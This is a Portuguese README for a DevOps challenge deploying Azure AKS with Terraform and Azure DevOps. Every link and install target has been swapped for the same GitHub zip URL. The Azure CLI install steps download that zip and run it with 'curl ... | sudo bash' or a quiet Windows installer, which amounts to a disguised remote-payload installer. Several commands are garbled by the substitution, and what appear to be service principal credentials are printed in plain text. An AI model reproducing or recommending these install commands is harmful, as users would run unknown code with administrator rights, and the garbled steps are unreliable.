# Devops-Challenge

# Infraestrutura-Utilizada

 - Solução de Cloud = Microsoft Azure
 - CI/CD = AzureDevOps
 - Orquestrador = Kubernetes
 - Provisionador = Terraform

## Task 1 - Criação de uma conta no Microsoft Azure

### Primeiramente, crie sua conta gratuita no Microsoft Azure conforme o artigo:

    https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip

### Após a criação e login no ambiente, execute a instalação do Azure CLI em seu dispositivo:

### Sistema Windows

    Invoke-WebRequest -Uri https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip -OutFile .\https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip; Start-Process https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip -Wait -ArgumentList '/I https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip /quiet'; rm .\https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip

### Sistema Mac

    brew update && brew install azure-cli

### Sistema Linux

    curl -sL https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip | sudo bash

    curl -sL https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip |
    gpg --dearmor |
    sudo tee https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip > /dev/null

    AZ_REPO=$(lsb_release -cs)
    echo "deb [arch=amd64] https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip $AZ_REPO main" | sudo tee https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip

    sudo apt-get update
    sudo apt-get install azure-cli

### Para validar se o Azure CLI foi instalado corretamente em seu dispositivo, execute o comando abaixo:

    az login

## Task 2 - Preparação do ambiente Microsoft Azure para receber as configurações

## Requisitos

### > Definir a região de hospedagem

    az configure --defaults location=eastus2

### > Criar um "Resource Group" para os recursos do Cluster AKS

    az group create -n ht-AksTerraform-RG -l eastus2

### > Criar uma "Storage Account" para o cluster do AKS

    az storage account create -n htsaaksterraform -g ht-AksTerraform-RG -l eastus2

### > Criar um container "tfstate" para o cluster do AKS

    az storage container create -n tfstate --account-name htsaaksterraform

### > Criar um "KeyVault" para o cluster do AKS

    az keyvault create -n ht-kvaksterraform -g ht-AksTerraform-RG -l eastus2

### > Criar um token SAS para a conta de armazenamento, armazenando no KeyVault

    az storage container generate-sas --account-name htsaaksterraform --expiry 2021-01-01 --name tfstate --permissions dlrw -o json | xargs az keyvault secret set --vault-name ht-kvaksterraform --name TerraformSASToken --value

### > Criar uma entidade de serviço para AKS e Azure DevOps

    az ad sp create-for-rbac -n "ht-AksTerraformSPN"

### > Criar uma chave ssh

    ssh-keygen  -f ~https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip

### > Armazenar a chave pública no Azure KeyVault

    az keyvault secret set --vault-name ht-kvaksterraform --name LinuxSSHPubKey -f ~https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip > /dev/null

### > Armazenar a entidade de serviço no Azure KeyVault

    az keyvault secret set --vault-name ht-kvaksterraform --name spn-id --value dfafd341-3f43-4b85-8944-21b014dbcfea > /dev/null

### > Armazenar a entidade de serviço no Azure KeyVault

    az keyvault secret set --vault-name ht-kvaksterraform --name spn-secret --value 008e522b-f1c5-45cd-8f9a-c609bbb504c6 > /dev/null

### > Infelizmente, o recurso Terraform Backend não suporta variáveis, então precisaremos passar o parâmetro no método init para configurar corretamente o back-end em nosso pipeline de CI/CD

    terraform init \
    -backend-config="resource_group_name=ht-AksTerraform-RG" \
    -backend-config="storage_account_name=htsaaksterraform" \
    -backend-config="container_name=tfstate"


## Task 3 - Criação do Pipeline CI/CD no AzureDevOps para Terraform

## Requisitos

### > Ambiente do Microsoft Azure preparados na Task 2


![node-to-node](https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip) 
![node-to-node](https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip) 
![node-to-node](https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip) 


### > Projeto criado no AzureDevOps:

    https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip

![node-to-node](https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip)

### > Service Connections criadas no Projeto do AzureDevOps

    https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip

![node-to-node](https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip)

## Task 3 - Deploy do ambiente usando CI/CD no AzureDevOps

## Requisitos

### > Repositório do projeto criado no AzureDevOps

![node-to-node](https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip)

### > Arquivos do Terraform

![node-to-node](https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip)

### > Arquivos da Aplicação:

![node-to-node](https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip)

### > Construção dos Pipelines

- O pipeline de deploy do Cluster AKS foi feito utilizando arquivos declarativos do Terraform e um YAML file do AzurePipelines conforme abaixo:

![node-to-node](https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip)

- O pipeline de deploy da aplicação foi feito via GUI para exemplificar as duas formas de se construir ambientes pelo AzureDevOps

![node-to-node](https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip)

### > Log de execução do pipeline de Terraform

[terraform_log](https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip)

### > Log de execução do pipeline de Aplicação

[votacao-app_log](https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip)

## Task 4 - Validação da Aplicação em funcionamento:

### > Para conectar no Cluster AKS Criado

    az aks get-credentials --resource-group AKSCluster-RG --name AKSTerraform

![node-to-node](https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip)

### > Validando como aplicação foi exposta

![node-to-node](https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip)

### > Acessando pelo browser

![node-to-node](https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip)

# Arquitetura-Final

![node-to-node](https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip)

### > AKS Cluster

![node-to-node](https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip)

### > AKS Networking

![node-to-node](https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip)

### > AKS Secrets

![node-to-node](https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip)

